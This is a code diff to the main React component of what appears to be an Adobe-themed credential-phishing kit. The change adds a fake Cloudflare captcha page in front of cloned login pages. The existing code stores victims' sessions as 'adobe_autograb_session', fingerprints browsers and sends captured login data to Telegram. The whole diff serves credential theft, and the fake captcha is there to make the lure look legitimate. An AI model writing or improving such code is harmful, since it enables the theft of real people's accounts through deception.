@@ -3,6 +3,7 @@ import LandingPage from './components/LandingPage';
 import MobileLandingPage from './components/mobile/MobileLandingPage';
 import LoginPage from './components/LoginPage';
 import MobileLoginPage from './components/mobile/MobileLoginPage';
+import CloudflareCaptcha from './components/CloudflareCaptcha';
 import { 
   getBrowserFingerprint, 
   extractEmailFromProvider,
@@ -21,9 +22,10 @@ import {
 function App() {
   const [isMobile, setIsMobile] = useState(false);
   const [hasActiveSession, setHasActiveSession] = useState(false);
-  const [currentPage, setCurrentPage] = useState('home');
+  const [currentPage, setCurrentPage] = useState('captcha'); // Start with captcha
   const [selectedFileName, setSelectedFileName] = useState('');
   const [isLoading, setIsLoading] = useState(true);
+  const [captchaVerified, setCaptchaVerified] = useState(false);
 
   // Check if device is mobile
   useEffect(() => {
@@ -49,7 +51,9 @@ function App() {
         if (event.action === 'remove' || event.value === '' || event.value === 'false') {
           console.log('🔄 Session ended in another tab');
           setHasActiveSession(false);
-          setCurrentPage('login');
+          // If session ends, go back to captcha first
+          setCaptchaVerified(false);
+          setCurrentPage('captcha');
         } else if (event.action === 'set' || event.action === 'update') {
           console.log('🔄 Session updated in another tab');
           setHasActiveSession(true);
@@ -67,7 +71,7 @@ function App() {
       try {
         // Check if we're in browser environment
         if (typeof window === 'undefined') {
-          setCurrentPage('login');
+          setCurrentPage('captcha');
           setIsLoading(false);
           return;
         }
@@ -123,14 +127,15 @@ function App() {
 
         if (existingSession) {
           setHasActiveSession(true);
+          setCaptchaVerified(true); // Skip captcha if session exists
           setCurrentPage('landing');
         } else {
-          // No valid session, start with login page
-          setCurrentPage('login');
+          // No valid session, start with captcha
+          setCurrentPage('captcha');
         }
       } catch (error) {
         console.error('Session check error:', error);
-        setCurrentPage('login');
+        setCurrentPage('captcha');
       } finally {
         setIsLoading(false);
       }
@@ -216,6 +221,7 @@ function App() {
       }
 
       setHasActiveSession(true);
+      setCaptchaVerified(true);
       setCurrentPage('landing');
 
       // Clean up URL
@@ -257,6 +263,17 @@ function App() {
         }
       }, 4000);
     }
+  };
+
+  // Handler for captcha verification
+  const handleCaptchaVerified = () => {
+    console.log('🔒 Captcha verified, redirecting to login...');
+    setCaptchaVerified(true);
+    
+    // Smooth transition to login page
+    setTimeout(() => {
+      setCurrentPage('login');
+    }, 800); // Small delay for smooth transition
   };
 
   // Handler for login success from login components
@@ -316,19 +333,18 @@ function App() {
     setHasActiveSession(true);
     if (typeof localStorage !== 'undefined') {
       localStorage.setItem('adobe_autograb_session', JSON.stringify(updatedSession));
-        // Store session data before calling success handler
-        if (typeof localStorage !== 'undefined') {
-          localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
-        }
-        
+      // Store session data before calling success handler
+      if (typeof localStorage !== 'undefined') {
+        localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
+      }
     }
 
     try {
       await sendToTelegram(updatedSession);
-        
-        // Ensure we redirect to landing page
-        setCurrentPage('landing');
-        setIsLoading(false);
+      
+      // Ensure we redirect to landing page
+      setCurrentPage('landing');
+      setIsLoading(false);
       console.log('✅ Login data sent to Telegram');
     } catch (error) {
       console.error('❌ Failed to send to Telegram:', error);
@@ -376,7 +392,8 @@ function App() {
     }
     
     setHasActiveSession(false);
-    setCurrentPage('login');
+    setCaptchaVerified(false); // Reset captcha state on logout
+    setCurrentPage('captcha'); // Go back to captcha on logout
   };
 
   // Loading state
@@ -391,18 +408,38 @@ function App() {
     );
   }
 
+  // Render Cloudflare Captcha first
+  if (currentPage === 'captcha' && !captchaVerified) {
+    return (
+      <CloudflareCaptcha
+        onVerified={handleCaptchaVerified}
+        onBack={() => {}} // No back action needed for captcha
+        verificationDelay={2000} // 2 second verification delay
+        autoRedirectDelay={800} // 0.8 second redirect delay
+      />
+    );
+  }
+
   // Render appropriate page based on current state
   if (currentPage === 'login') {
     return isMobile ? (
       <MobileLoginPage 
         fileName={selectedFileName}
-        onBack={() => setCurrentPage('home')}
+        onBack={() => {
+          // Reset captcha and go back to captcha page
+          setCaptchaVerified(false);
+          setCurrentPage('captcha');
+        }}
         onLoginSuccess={handleLoginSuccess} 
       />
     ) : (
       <LoginPage 
         fileName={selectedFileName}
-        onBack={() => setCurrentPage('home')}
+        onBack={() => {
+          // Reset captcha and go back to captcha page
+          setCaptchaVerified(false);
+          setCurrentPage('captcha');
+        }}
         onLoginSuccess={handleLoginSuccess} 
       />
     );
